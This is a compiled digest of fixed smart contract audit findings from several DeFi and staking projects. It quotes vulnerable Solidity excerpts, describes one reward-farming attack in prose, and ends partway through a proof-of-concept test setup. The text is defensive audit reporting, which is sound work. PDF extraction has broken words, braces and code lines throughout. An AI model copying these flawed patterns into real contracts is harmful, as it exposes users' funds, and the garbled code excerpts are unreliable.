# time - 已修復 Medium/High Issues（完整版）

- 篩選：`Severity in {Medium, High}` 且 `Status = Fixed`
- 說明：本版為完整敘述，不做刪節號截斷
- 筆數：10

## F-2025-14456 - Testnet Time Constants Used in Production Code
- 嚴重度：Medium
- Report source：Acecoin.pdf

### 問題內容（完整）
The contracts `Subscription.sol` and `StakingAndRewards.sol` use testnet timeduration constants instead of mainnet values. All time-related constantsare configured for testing purposes (minutes/seconds) rather thanproduction deployment (days/hours), causing the entire economic modeland subscription system to malfunction on mainnet deployment. This vulnerability has severe economic and operational consequences: Subscription System: Users pay for a "monthly" subscription that expires in 30 minutesinstead of 30 daysUsers must renew subscriptions 1,440 times per month (every 30minutes)Completely unusable subscription model on mainnet Rewards System: Monthly rewards 10%/month) are calculated over 15 minutes insteadof 30 daysRewards accrue faster than intendedContract funds would be drained almost immediately `Subscription.sol`: uint256 public constant `MAX_FEE` = 3 * 1e6; /* 3 `USDT` (6 decimals) */ uint256 public constant `SUBSCRIPTION_PERIOD` = 30 minutes; /* 30 days */ // ← `BUG`: Should be 30 days `StakingAndRewards.sol`: uint256 public constant `MAX_DAILY_TEAM_REWARD` = 30e18; uint256 public constant `MAX_REWARD_MULTIPLIER` = 20000; uint256 private constant `REWARD_DURATION` = 30 minutes; // ← `BUG`: Should be 30 days uint256 private constant `DAY` = 30 seconds; // Should be 1 days Assets: `StakingAndRewards.sol` [https://github.com/AMGAceToken/Ace-SmartContracts]Subscription.sol [https://github.com/AMGAceToken/Ace-SmartContracts] 22 Status: Fixed

### 修補方式（建議）
Consider identifying and updating all testnet time constants to mainnetvalues as intended. For instance: uint256 private constant `REWARD_DURATION` = 30 days; uint256 public constant `SUBSCRIPTION_PERIOD` = 30 days; uint256 private constant `DAY` = 1 days; Resolution: Fixed in commit f9604f9. The codebase replaced the testnet-only timeconstants with production durations, setting `SUBSCRIPTION_PERIOD` and `REWARD_DURATION` to 30 days and defining `HOURS`/`DAY`/`MONTH`/`MAX_INACTIVE_PERIOD` using standard hour/day-based values to restore the intended subscriptionand rewards economics. 23

### 修補方式（實際）
Fixed in commit f9604f9. The codebase replaced the testnet-only timeconstants with production durations, setting `SUBSCRIPTION_PERIOD` and `REWARD_DURATION` to 30 days and defining `HOURS`/`DAY`/`MONTH`/`MAX_INACTIVE_PERIOD` using standard hour/day-based values to restore the intended subscriptionand rewards economics. 23

## F-2025-14457 - Subscription Renewal Resets Timer Instead of Extending Causing User Fund Loss
- 嚴重度：Medium
- Report source：Acecoin.pdf

### 問題內容（完整）
The `renewSubscription()` and `subscribeToLevel()` functions reset subscriptiontimers to the current timestamp instead of extending from the existingexpiry time. This causes users who renew early (before expiration) to losetheir remaining paid subscription time and waste their payment. Affected Functions: `Subscription.sol`::`renewSubscription()` `Subscription.sol`::`subscribeToLevel()` Users lose money and subscription time when renewing before expiration: Early Main Subscription Renewal Day 0 User pays 1 `USDT`, subscription valid until Day 30Day 5 User renews (pays another 1 `USDT` Expected: Subscription extends to Day 60 30 30 Actual: Subscription resets to Day 35 5 30 Loss: 25 days (worth 0.83 `USDT` wasted) `Subscription.sol` (renew): function `renewSubscription()` external nonReentrant { uint256 userId = userIds[`msg.sender`]; `require(userId != 0, "Not registered")`; User storage user = users[userId]; uint256 fee = getRegistrationFee(`msg.sender`); if (fee > 0 && aceFoundationWallet != `address(0)`) { require(usdtToken.balanceOf(`msg.sender`) >= fee, "Insufficient `USDT` ba lance"); require(usdtToken.allowance(`msg.sender`, `address(this)`) >= fee, "Insuf ficient `USDT` allowance"); require(usdtToken.transferFrom(`msg.sender`, aceFoundationWallet, fee), "ERC20: transfer failed"); } user.lastMainPayment = `block.timestamp`; // ! Always resets to now, doesn 't extend `_updateActiveStatus`(userId); emit `SubscriptionRenewed(userId, fee)`; } 24 `Subscription.sol` (subscribe to specific level): function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReentr ant { uint256 userId = userIds[`msg.sender`]; `require(isMainActive(userId)`, "Main subscription inactive"); `require(level == 0 || user.levelInfo[level-1].isActive, "Previous level i nactive")`; uint256 fee = getLevelFee(`msg.sender`, level); } user.levelInfo[level] = LevelInfo(`block.timestamp`, true); // ! Resets ti mer emit `LevelSubscribed(userId, level, fee)`; } Assets: `Subscription.sol` [https://github.com/AMGAceToken/Ace-SmartContracts] Status: Fixed

### 修補方式（建議）
Consider extending the subscription when someone makes a payment,instead of resetting the subscription timer. Resolution: Fixed in c9d413a. Both `renewSubscription()` and `subscribeToLevel()` have beenprotected and now can only be executed when the main or levelsubscription is over: `renewSubscription()` function `renewSubscription()` external nonReentrant { … if (`isMainActive(userId)`) revert `SubscriptionAlreadyActive()`; } `subscribeToLevel()` function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReentr ant { … if (`isLevelActive(userId, level)`) revert `LevelAlreadySubscribed()`; } 26

### 修補方式（實際）
Fixed in c9d413a. Both `renewSubscription()` and `subscribeToLevel()` have beenprotected and now can only be executed when the main or levelsubscription is over: `renewSubscription()` function `renewSubscription()` external nonReentrant { … if (`isMainActive(userId)`) revert `SubscriptionAlreadyActive()`; } `subscribeToLevel()` function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReentr ant { … if (`isLevelActive(userId, level)`) revert `LevelAlreadySubscribed()`; } 26

## F-2025-14480 - Missing State Validation Enables Re-Subscription to An Active Level
- 嚴重度：Medium
- Report source：Acecoin.pdf

### 問題內容（完整）
The `subscribeToLevel(uint256 level)` function allows a user to subscribe tothe same level multiple times without restriction. The function does notverify whether the target level is already active for the caller beforeprocessing the subscription and charging the fee. function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReentr ant { uint256 userId = userIds[`msg.sender`]; `require(userId != 0, "Not registered")`; User storage user = users[userId]; `require(isMainActive(userId)`, "Main subscription inactive"); `require(level == 0 || user.levelInfo[level-1].isActive, "Previous level i nactive")`; uint256 fee = getLevelFee(`msg.sender`, level); user.levelInfo[level] = LevelInfo(`block.timestamp`, true); emit `LevelSubscribed(userId, level, fee)`; } There is no check ensuring that the level is not active prior to execution.As a result, an already active level can be subscribed to again, overwritingthe existing `LevelInfo()` and recharging the fee. Assets: `Subscription.sol` [https://github.com/AMGAceToken/Ace-SmartContracts] Status: Fixed

### 修補方式（建議）
It is recommended to explicitly prevent re-subscription to an already activelevel by adding a validation check: error `LevelAlreadySubscribed()`; require(!isLevelActive(`msg.sender`, level), `LevelAlreadySubscribed()`); Resolution: Fixed in c9d413a. The protection against the re-subscription to the samelevel has been implemented in the `subscribeToLevel()` function as follows: function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReent rant { … if (`isLevelActive(userId, level)`) revert `LevelAlreadySubscribed()`; } 44

### 修補方式（實際）
Fixed in c9d413a. The protection against the re-subscription to the samelevel has been implemented in the `subscribeToLevel()` function as follows: function `subscribeToLevel(uint256 level)` external `validLevel(level)` nonReent rant { … if (`isLevelActive(userId, level)`) revert `LevelAlreadySubscribed()`; } 44

## F-2025-14490 - Team Rewards Accumulate Without Required Active Stake
- 嚴重度：High
- Report source：Acecoin.pdf

### 問題內容（完整）
The documentation states that "The user must have an active stake" toreceive team rewards. However, `_processTeamRewards`() does `NOT` check ifthe referrer has an active stake before accumulating team rewards. That isa gap in the system invariants and the reward-accumulating process. Thisallows users to: Register and subscribe without staking Accumulate team rewards from downlines' claims Stake minimally later Claim all accumulated team rewards immediately Impact Users can accumulate team rewards without meeting the stakerequirementThey can then stake a minimal amount and claim all accumulatedrewardsThis violates the documented requirement and undermines stakingincentives Example Attack: Attacker registers with subscriptions but does not stake anything Builds a referral network of active stakers Accumulates 1000 `ACE` in team rewards over months (without staking) Stakes 100 `ACE` (minimum) Claims all 1000 `ACE` team rewards immediately Effectively gets 10x return without real staking commitment To receive team rewards: The user must have an active stake. `StakingAndRewards.sol`: function `_processTeamRewards`(address user, uint256 claimedAmount) internal { . /* Skip team rewards if referrer is inactive */ if (!isReferrerActive) continue; bool canReceiveReward = false; if (level == 0) { canReceiveReward = `affiliate.isMainActive(referrerId)` && affiliate .`isLevelActive(referrerId, 0)`; } else { 13 canReceiveReward = `affiliate.isMainActive(referrerId)` && affiliate .`isLevelActive(referrerId, level)`; } if (!canReceiveReward) continue; // ! `MISSING` `CHECK`: Does referrer have an active stake? // Documentation says: "The user must have an active stake" to receive team rewards uint256 teamReward = (claimedAmount * `TEAM_REWARD_PERCENT`) / `PERCENT_D` `ENOMINATOR`; TeamReward storage reward = teamRewards[referrerAddress][level]; reward.totalReward += teamReward; } } There is noverification that the referrer has an active stake beforeaccumulating team rewards. Assets: `StakingAndRewards.sol` [https://github.com/AMGAceToken/Ace-SmartContracts] Status: Fixed

### 修補方式（建議）
Add a check for an active stake in `_processTeamRewards`(): function `_processTeamRewards`(address user, uint256 claimedAmount) internal { if (`isProtectionSystemActive()`) { return; 14 } uint256 userId = `affiliate.userIds(user)`; uint256[12] memory referrers = `affiliate.getReferrers(userId)`; uint256 currentTime = `block.timestamp`; for (uint256 level = 0; level < 12; level++) { uint256 referrerId = referrers[level]; if (referrerId == 0) continue; address referrerAddress = `affiliate.getUserAddress(referrerId)`; if (referrerAddress == `address(0)`) continue; if (hasUnstaked[referrerAddress]) continue; // `FIX`: Check if referrer has an active stake bool hasActiveStake = activeStakes[referrerAddress][0].active || activeStakes[referrerAddress][1].active; if (!hasActiveStake) continue; // Skip if no active stake // … rest of checks and processing } } Resolution: Fixed in commit f9604f9. The codebase added an explicit active-stakerequirement in `_processTeamRewards`() by checking whether the referrer hasat least one active stake (slot 0 or slot 1) before accumulating teamrewards, aligning reward accrual with the documented “active stakerequired” requirement.

### 修補方式（實際）
Fixed in commit f9604f9. The codebase added an explicit active-stakerequirement in `_processTeamRewards`() by checking whether the referrer hasat least one active stake (slot 0 or slot 1) before accumulating teamrewards, aligning reward accrual with the documented “active stakerequired” requirement.

## F-2026-14510 - Unimplemented pending Reward State Variable Results in Dead Code and Potential Reward Accounting Issues
- 嚴重度：Medium
- Report source：Acecoin.pdf

### 問題內容（完整）
The `StakingAndRewards.sol` contract contains a pendingReward field in the Stake struct that is initialized to zero upon stake creation but is never updatedthroughout the contract's lifetime. This represents dead code thatsuggests an incomplete implementation of the reward accountingmechanism, potentially leading to loss of unclaimed rewards in edge casesand unnecessary gas costs.The pendingReward field is defined in the Stake struct struct Stake { uint256 stakeId; uint256 amount; uint256 startTime; uint256 lastClaimTime; uint256 totalClaimed; uint256 pendingReward; bool active; } and initialized in the StakingAndRewards::`stake()` function. During stakecreation, this field is set to zero: function `stake(uint256 amount)` external onlyActive nonReentrant { … activeStakes[`msg.sender`][slotIndex] = Stake({ stakeId: stakeId, amount: amount, startTime: `block.timestamp`, lastClaimTime: `block.timestamp`, totalClaimed: 0, pendingReward: 0, active: true }); } The field is subsequently read in multiple reward calculation functions butnever written to: function `_calculateRewardAmount`(Stake storage stakeEntry, uint256 activeU 57 ntil, uint256 /* unused */, address /* unused */) private view returns (uint2 56 finalReward, bool shouldContinue) { uint256 startTime = stakeEntry.lastClaimTime; /* For first claim, use stake start time, otherwise use lastClaimTime */ if (startTime == 0) { startTime = stakeEntry.startTime; } if (activeUntil <= startTime) { return (stakeEntry.pendingReward, false); } uint256 elapsed = activeUntil - startTime; uint256 rate = `_getRewardRate`(); uint256 newReward = (stakeEntry.amount * rate * elapsed) / (`MONTH` * P `ERCENT_DENOMINATOR`); uint256 totalReward = stakeEntry.pendingReward + newReward; uint256 maxReward = (stakeEntry.amount * `MAX_REWARD_MULTIPLIER`) / `PER` `CENT_DENOMINATOR`; if (stakeEntry.totalClaimed >= maxReward) { return (0, false); } uint256 remainingReward = maxReward - stakeEntry.totalClaimed; finalReward = totalReward > remainingReward ? remainingReward : total Reward; shouldContinue = false; } Similarly in `_calculateSingleReward`(): function `_calculateSingleReward`(Stake storage stakeEntry, address user) priva te view returns (uint256) { if (!stakeEntry.active) return 0; uint256 userId = `affiliate.userIds(user)`; if (userId == 1) return 0; uint256 lastPaymentTime = `affiliate.getLevelPaymentInfo(userId, 0)`; if (lastPaymentTime == 0) return 0; uint256 activeUntil = `_calculateActiveTimePeriod`(user, userId); uint256 startTime = stakeEntry.lastClaimTime; if (startTime == 0) { 58 startTime = stakeEntry.startTime; } if (activeUntil <= startTime) { return stakeEntry.pendingReward; if (stakeEntry.totalClaimed >= maxReward) return 0; uint256 finalReward = totalReward > remainingReward ? remainingReward : return finalReward; } Impact: Reward Loss in Edge Cases: When activeUntil <= startTime (indicatingan inactive period), the contract returns stakeEntry.pendingReward whichis always 0. This means any rewards that should have been pendingfrom previous active periods are effectively lost, as they were neverstored in pendingReward. Gas Inefficiency: Every Stake struct wastes 32 bytes of storage (onestorage slot) for a field that serves no purpose, increasing deploymentand operational costs unnecessarily. Code Maintainability: The presence of unused code suggestsincomplete implementation and makes the codebase harder to auditand maintain, potentially masking other vulnerabilities. Design Inconsistency: The code structure implies that rewardsshould accumulate in pendingReward during activity gaps, but thismechanism is non-functional, creating a gap between intended andactual behavior. Assets: `StakingAndRewards.sol` [https://github.com/AMGAceToken/Ace-SmartContracts] Status: Fixed 59

### 修補方式（建議）
It is recommended to: consider the system redesign and implementation of the properpendingReward tracking.remove the dead unused code. Resolution: Fixed in 1829f31. The redundant pendingReward variable was removed fromthe codebase. 60

### 修補方式（實際）
Fixed in 1829f31. The redundant pendingReward variable was removed fromthe codebase. 60

## F-2026-16037 - Auto-Swap Reverts During Sell Execution Can Deny User Exits
- 嚴重度：Medium
- Report source：Knoxnet.pdf

### 問題內容（完整）
In KnoxNet, the `_transferFrom` function invokes `_autoSwapBack` duringqualifying sell transactions, coupling the userʼs sell path to externalUniswap router calls. If the internal tax swap or liquidity addition reverts,the entire user sell transaction reverts as well. As a result, users can beprevented from selling whenever the auto-swap path becomes temporarilyinvalid or fails at execution time. In KnoxNet, the `_transferFrom` function triggers `_autoSwapBack` synchronouslyinside the taxed transfer flow: if (`_shouldApplyTax`(sender, recipient)) { amountReceived = `_applyTax`(recipient, amount); if (`_shouldAutoSwap`(recipient) && amount > 0) `_autoSwapBack`(amount); } The `_autoSwapBack` function then performs external router operations thatare not isolated from the user transaction. Both the token-to-`ETH` swapand the optional liquidity addition are executed inline, so any revert ineither call propagates back to the original sell: `router.swapExactTokensForETHSupportingFeeOnTransferTokens( amountToSwap, 0, path, address(this)`, `block.timestamp` ); if (amountToLiquify > 0) { router.addLiquidityETH{value: amountETHLiquidity}( `address(this)`, amountToLiquify, 0, 0, liquidityTaxReceiver, `block.timestamp` ); } This design creates multiple revert paths. For example, rounding canreduce the swappable amount to zero after the liquidity split, or liquidityaddition can be attempted with an invalid `ETH`/token ratio. Because these 41 failures occur inside the sell path, the user transaction cannot completeindependently of the tax-processing logic. User sell transactions can revert even when the transfer itself is otherwisevalid. This can temporarily block exits for all affected sellers until auto-swap conditions change or privileged configuration is updated. Assets: `contracts/KnoxNet.sol` [https://github.com/Knoxnetofficial/knoxnet-contracts] Status: Fixed

### 修補方式（建議）
The tax-processing path should be decoupled from the user sell path.External router calls inside `_autoSwapBack` should be wrapped in try/catch, orfailed auto-swap attempts should be skipped and deferred so that the selltransaction can still complete. Resolution: Fixed inc20e980: In KnoxNet, the auto-swap path has been isolated from the user sell flowby wrapping the external router calls in try/catch and returning on failureinstead of propagating a revert. The swapExactTokensForETHSupportingFeeOnTransferTokens call and the optional addLiquidityETH call no longer cause the enclosing sell transaction to failwhen the auto-swap path is temporarily invalid. if (`_shouldApplyTax`(sender, recipient)) { amountReceived = `_applyTax`(sender, recipient, amount); if (`_shouldAutoSwap`(recipient)) `_autoSwapBack`(amount); } function `_autoSwapBack`(uint256 amount) internal swapping { // … try 42 `router.swapExactTokensForETHSupportingFeeOnTransferTokens( swapTokens, 0, path, address(this)`, `block.timestamp` + `ROUTER_DEADLINE_SECONDS` ) {} catch { return; try router.addLiquidityETH{value: amountETHLiquidity}( `address(this)`, liquidityTokensToLiquify, minToken, minETH, liquidityTaxReceiver, `block.timestamp` + `ROUTER_DEADLINE_SECONDS` ) returns (uint256, uint256 ethUsed, uint256) { accumulatedLiquidityTokens -= liquidityTokensToLiquify; addedLiquidityTokens = liquidityTokensToLiquify; addedLiquidityETH = ethUsed; } catch { // skip liquidity addition on failure; tokens + `ETH` remain in contract } } 43

### 修補方式（實際）
Fixed inc20e980: In KnoxNet, the auto-swap path has been isolated from the user sell flowby wrapping the external router calls in try/catch and returning on failureinstead of propagating a revert. The swapExactTokensForETHSupportingFeeOnTransferTokens call and the optional addLiquidityETH call no longer cause the enclosing sell transaction to failwhen the auto-swap path is temporarily invalid. if (`_shouldApplyTax`(sender, recipient)) { amountReceived = `_applyTax`(sender, recipient, amount); if (`_shouldAutoSwap`(recipient)) `_autoSwapBack`(amount); } function `_autoSwapBack`(uint256 amount) internal swapping { // … try 42 `router.swapExactTokensForETHSupportingFeeOnTransferTokens( swapTokens, 0, path, address(this)`, `block.timestamp` + `ROUTER_DEADLINE_SECONDS` ) {} catch { return; try router.addLiquidityETH{value: amountETHLiquidity}( `address(this)`, liquidityTokensToLiquify, minToken, minETH, liquidityTaxReceiver, `block.timestamp` + `ROUTER_DEADLINE_SECONDS` ) returns (uint256, uint256 ethUsed, uint256) { accumulatedLiquidityTokens -= liquidityTokensToLiquify; addedLiquidityTokens = liquidityTokensToLiquify; addedLiquidityETH = ethUsed; } catch { // skip liquidity addition on failure; tokens + `ETH` remain in contract } } 43

## F-2026-15022 - Owner Rights Can Be Renounced While Contract Is Paused Permanently Locking Transfer
- 嚴重度：Medium
- Report source：Node Meta.pdf

### 問題內容（完整）
The `NTE` contract includes pausable functionality, allowing the owner topause transfers in emergencies. The `_transferWithTax`() function implementcheck of the `_paused` variable status to prevent any transfer when thecontract is paused. function `_transferWithTax`(address from, address to, uint256 amount) internal nonReentrant { // If we're paused, everything stops (unless you're the owner) if (`_paused`) { if (pauseIncludesOwner) { revert `SYS_DISABLED`(); } else { if (from != `_owner` && to != `_owner`) revert `SYS_DISABLED`(); } It also exposes a `renounceOwnership()` function that allows the owner torenounce ownership after 30 days from deployment, permanently settingthe owner to the zero address. However, the function lacks a safeguard toprevent `renounceOwnership()` from being executed while the contract ispaused. function `renounceOwnership()` public onlyOwner { if (`block.timestamp` <= launchTime + 30 days) revert `AUTH_LOCKED`(); address previousOwner = `_owner`; `_owner` = `address(0)`; emit OwnershipTransferred(previousOwner, `address(0)`); } If `renounceOwnership()` is called while the contract is paused, ownershiprights are permanently renounced with no possibility of recovery. Since noentity will retain the ability to unpause the contract, all transfers will remainfrozen indefinitely. This effectively renders the protocol unusable andpermanently locks all user funds. This creates a critical risk of permanentcontract paralysis, leading to severe financial loss for participants and asignificant loss of trust in the protocol. 26 Assets: `NTE.sol` [https://github.com/nodemeta/nte] Status: Fixed

### 修補方式（建議）
Introduce a proper validation in the `renounceOwnership()` function to ensureownership cannot be renounced while the contract is paused. Thissafeguard guarantees that the contract can always be unpaused beforeownership is permanently removed. function `renounceOwnership()` public onlyOwner { if (`_paused`) revert `SYS_DISABLED`(); } Resolution: Fixed in 318db5a, the pause state is now checked in the `renounceOwner()` toprevent calling function once the contract is paused: } 27

### 修補方式（實際）
Fixed in 318db5a, the pause state is now checked in the `renounceOwner()` toprevent calling function once the contract is paused: function `renounceOwnership()` public onlyOwner { if (`_paused`) revert `SYS_DISABLED`(); } 27

## F-2026-15229 - Cooldown Timer Reset on Repeated Calls Leads to Extended Staking on Previously Queued Assets
- 嚴重度：Medium
- Report source：Overlayer.pdf

### 問題內容（完整）
The cooldown functions manage a per-user struct with a timestamp andan asset accumulator. On each call, the timestamp is overwritten with afresh deadline while the asset amount is incremented: cooldowns[`msg.sender`].cooldownEnd = uint104(`block.timestamp`) + cooldownDurati on; cooldowns[`msg.sender`].underlyingAmount += `uint152(assets_)`; A user who calls the cooldown function twice — for example, once toqueue 100 OverlayerWrap and again 30 days later to queue 50 more — willhave their deadline reset to a new countdown from the second call. The100 OverlayerWrap from the first call must wait a new full cooldownDuration 90 days), effectively losing the 30 days already accrued under theprevious cooldown. During the entire cooldown period, assets sit in theSilo contract, which is a simple transfer-only holder with no yieldgeneration. There is no cancel function. There is no partial unstake — the claimfunction releases the full queued amount or nothing: if (`block.timestamp` >= userCooldown.cooldownEnd || cooldownDuration == 0) { userCooldown.cooldownEnd = 0; userCooldown.underlyingAmount = 0; `SILO`.`withdraw(receiver_, assets)`; } else { revert `IStakedOverlayerWrapCooldownInvalidCooldown()`; } A user who discovers the timer reset has no mechanism to cancel orpreserve the original cooldown: the assets remain locked earning zeroyield until the new cooldown expires. No third-party griefing vector exists— only the user themselves can trigger their own cooldown. The impact isself-inflicted, but the absence of any documentation warning or revert-on-existing-cooldown guard makes this an unguarded state transition thatsilently penalizes repeat callers. Yield loss is real and proportional to thecooldown duration (up to 90 days of foregone staking rewards). Assets: `contracts/overlayer/StakedOverlayerWrap.sol`[https://github.com/Overlayerfi/contracts/tree/main] Status: Fixed 19

### 修補方式（建議）
The following remediation options address the timer-reset behavior atdifferent levels of complexity: Reject cooldown calls when an active cooldown already exists as ashort term solution.Introduce a `cancelCooldown()` function that returns the escrowed assetsfrom the OverlayerWrapSilo back to the staking vault, crediting the stakerwith equivalent shares. This provides a recovery path for stakers whotrigger the timer reset inadvertently.Implement per-cooldown tracking using a mapping of cooldown IDs oran array of UserCooldown structs, allowing each cooldown batch tomaintain an independent timer. This enables additive cooldownswithout interfering with previously queued assets. Resolution: Fixed in d07a0a1, the cooldown functionality was removed. TheStakedOverlayerWrap vault now operates solely under the original `ERC` 4626 flow. This allows users to withdraw their assets and rewardsimmediately, without any time restriction. 20

### 修補方式（實際）
Fixed in d07a0a1, the cooldown functionality was removed. TheStakedOverlayerWrap vault now operates solely under the original `ERC` 4626 flow. This allows users to withdraw their assets and rewardsimmediately, without any time restriction. 20

## F-2025-13597 - O -By-One Error in`_exceeds Max Claimable Periods()` Allows Claiming One Extra Period Beyond Con gured Maximum
- 嚴重度：Medium
- Report source：Vechain Foundation.pdf

### 問題內容（完整）
The `_exceedsMaxClaimablePeriods`() function in `Stargate.sol` contains an off-by-one error that fails to correctly detect when a token has accumulatedexactly maxClaimablePeriods + 1 periods 833 when max is 832 . Thefunction uses strict greater-than (>) comparison when it should usegreater-than-or-equal (>=) to account for inclusive period counting. When counting periods from firstClaimablePeriod to lastClaimablePeriod inclusively, the total number of periods is calculated as: numberOfPeriods = lastClaimablePeriod - firstClaimablePeriod + 1 For example, periods 1 to 833 means 833 total periods. The current implementation calculates the difference without the +1: difference = lastClaimablePeriod - firstClaimablePeriod // For periods 1-833: difference = 833 - 1 = 832 Then it checks: if (difference > maxClaimablePeriods) // 832 > 832? `FALSE` This check is mathematically equivalent to if (numberOfPeriods > maxClaimablePeriods + 1), which means it only returns true when there areMORE than 833 periods (like 834 , when it should return true for MOREthan 832 periods (like 833 . In the Natspecs, the logic was explained as the following: // Example: if max claimable periods is set to 4 // and the first claimable period is 1 // we need to set the last claimable period to 1 + 4 - 1 = 4 // so we are able to claim periods 1, 2, 3 and 4 lastClaimablePeriod = firstClaimablePeriod + $.maxClaimablePeriods - 1; It was correctly applied the -1 adjustment in the capping formula (line 676)but it was failed to apply this same logic to the validation check. As a result, reward claim for one extra period conflicts with theintendeddesign. 38 Status: Fixed

### 修補方式（建議）
Change the comparison from > to >= on `_exceedsMaxClaimablePeriods`() function to prevent the extra period claim. Resolution: The finding is fixed in commit hash 5f2e9cc after changing the comparisonoperator from > (strict greater-than) to >= (greater-than-or-equal) in the `_exceedsMaxClaimablePeriods`() function. This corrects the off-by-one errorthat previously allowed users to claim rewards for one extra period beyondthe configured maximum. 39

### 修補方式（實際）
The finding is fixed in commit hash 5f2e9cc after changing the comparisonoperator from > (strict greater-than) to >= (greater-than-or-equal) in the `_exceedsMaxClaimablePeriods`() function. This corrects the off-by-one errorthat previously allowed users to claim rewards for one extra period beyondthe configured maximum. 39

## F-2025-13723 - Permanent Phantom Stake Accumulation Due to Missing Effective Stake Cleanup on Re-delegation
- 嚴重度：High
- Report source：Vechain Foundation.pdf

### 問題內容（完整）
A significant accounting vulnerability exists in the `Stargate.sol` contract'sdelegation mechanism that allows permanent phantom effective stake toaccumulate on validators when users re-delegate their tokens from `EXITED` or `PENDING` status to a new validator. The `_delegate`() function correctlyincreases the effective stake for the new validator but fails to decrease theeffective stake from the old validator when handling re-delegationscenarios. This creates a permanent inflation of the delegatorsEffectiveStake value that can never be cleaned up without a contract upgrade. `Stargate.sol`: function `_delegate`(StargateStorage storage $, uint256 `_tokenId`, address `_vali` dator) private { // … existing validation code … . if (status == DelegationStatus.`PENDING`) { emit DelegationExitRequested( `_tokenId`, currentValidator, currentDelegationId, `Clock.clock()` ); } } // `VULNERABILITY`: Missing effective stake decrease for currentValidator // The old validator still has the effective stake even though delegation moved // … code continues … // Later in the function: (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPe riodDetails( `_validator` ); $.delegationIdByTokenId[`_tokenId`] = delegationId; $.lastClaimedPeriod[`_tokenId`] = completedPeriods + 1; // Correctly increases effective stake for `NEW` validator `_updatePeriodEffectiveStake`($, `_validator`, `_tokenId`, completedPeriods + 2, true); // But `OLD` validator's effective stake was never decreased! } 21 Comparison with Correct Implementation: The `requestDelegationExit()` function properly decreases effective stake(lines 458 504 function requestDelegationExit(uint256 `_tokenId`) external whenNotPaused onlyTokenOwner(`_tokenId`) nonReentrant { // … exit handling code … // Get the latest completed period of the validator (, , , uint32 completedPeriods) = $.protocolStakerContract.getValidationPe `riodDetails( delegation.validator )`; // `CORRECTLY` decreases the effective stake `_updatePeriodEffectiveStake`($, delegation.validator, `_tokenId`, completedPe riods + 2, false); emit DelegationExitRequested(`_tokenId`, delegation.validator, delegationId, exitBlock); } The missing effective stake cleanup logic causes permanent accountingcorruption where the total effective stake across all validators becomesinflated by the phantom stake amount, breaking the fundamental invariantthat total effective stake should equal the sum of all active delegations.Additionally, the phantom stake may accumulate over time with each re-delegation, creating a cumulative effect that worsens the reward dilutionwith every occurrence. Assets: `packages/contracts/contracts/Stargate.sol`[https://github.com/vechain/stargate] Status: Fixed

### 修補方式（建議）
Add effective stake cleanup when re-delegating from `EXITED` or `PENDING` status. The fix should ensure that the old validator's effective stake isproperly decreased before increasing the new validator's effective stake. `Stargate.sol`: function `_delegate`(StargateStorage storage $, uint256 `_tokenId`, address `_vali` dator) private { // … existing validation code … uint256 currentDelegationId = $.delegationIdByTokenId[`_tokenId`]; // If the token was previously exited or pending if (status == DelegationStatus.`EXITED` || status == DelegationStatus.`PENDI` NG) { (address currentValidator, , , ) = $.protocolStakerContract.getDelega `tion( currentDelegationId )`; // `POTENTIAL` `FIX`: Decrease effective stake for old validator before w ithdrawing if (currentValidator != `address(0)`) { // Get the current period for the old validator (, , , uint32 oldCompletedPeriods) = $.protocolStakerContract .`getValidationPeriodDetails(currentValidator)`; // Decrease the effective stake for the old validator // This is idempotent - safe to call even if already decreased `_updatePeriodEffectiveStake`( $, currentValidator, `_tokenId`, oldCompletedPeriods + 2, false // decrease ); } $.`protocolStakerContract.withdrawDelegation(currentDelegationId)`; emit DelegationWithdrawn( `_tokenId`, currentValidator, currentDelegationId, token.vetAmountStaked ); if (status == DelegationStatus.`PENDING`) { 23 emit DelegationExitRequested( `_tokenId`, currentValidator, currentDelegationId, `Clock.clock()` ); rest of function remains the same … } Resolution: The finding is fixed in commit hash eb5b8cb after adding validator statuschecks in the `_delegate`() function. The fix properly decreases delegatorsEffectiveStake from the old validator when re-delegating from `PENDING` delegation status or when the old validator has `EXITED` status,preventing permanent phantom stake accumulation. The fix correctlyavoids double-decreasing when the user had already requested exit via `requestDelegationExit()`.

### 修補方式（實際）
The finding is fixed in commit hash eb5b8cb after adding validator statuschecks in the `_delegate`() function. The fix properly decreases delegatorsEffectiveStake from the old validator when re-delegating from `PENDING` delegation status or when the old validator has `EXITED` status,preventing permanent phantom stake accumulation. The fix correctlyavoids double-decreasing when the user had already requested exit via `requestDelegationExit()`.

## Cyfrin Fixed Issues (Merged)
- Count: `48`
- Filter: `Severity in {Critical, Medium}` and explicit `Fixed/Resolved markers`
- Source: `cyfrin/*.md`

## [C-1] Not all reward token rewards are claimable
- Severity: `Critical`
- Source report: `core.md`

### Detailed Content (from source)
**Description:** The `lastEpochClaimedStaker`, `lastEpochClaimedCurator` and `lastEpochClaimedOperator` mappings in the `Rewards` contract track the last epoch for which a staker/curator/operator has claimed rewards, but it is keyed only by the staker's/curator's/operator's address and not by the reward token. This means that when a staker/curator/operator claims rewards for a given epoch and reward token, the contract updates the mappings for all tokens, not just the one claimed. As a result, if a staker/curator/operator is eligible for rewards from multiple tokens for the same epoch(s), claiming rewards for one token will prevent them from claiming rewards for the others for those epochs.

**Impact:** Stakers/curators/operators who are eligible to receive rewards in multiple tokens for the same epoch(s) will only be able to claim rewards for one token. Once they claim for one token, the contract will mark all those epochs as claimed, making it impossible to claim the rewards for the other tokens. This leads to loss of rewards for stakers/curators/operators and breaks the expected behavior of multi-token reward distribution.

**Proof of Concept:**
1. Change the `_setupStakes` function in the `RewardsTest.t.sol` file:
```solidity
// Sets up stakes for all operators in a given epoch
function _setupStakes(uint48 epoch, uint256 uptime) internal {
	address[] memory operators = middleware.getAllOperators();
	uint256 timestamp = middleware.getEpochStartTs(epoch);

	// Define operator stake percentages (must sum to 100%)
	uint256[] memory operatorPercentages = new uint256[](10);
	operatorPercentages[0] = 10;
	operatorPercentages[1] = 10;
	operatorPercentages[2] = 10;
	operatorPercentages[3] = 10;
	operatorPercentages[4] = 10;
	operatorPercentages[5] = 10;
	operatorPercentages[6] = 10;
	operatorPercentages[7] = 10;
	operatorPercentages[8] = 10;
	operatorPercentages[9] = 10;

	uint256 totalStakePerClass = 3_000_000 ether;

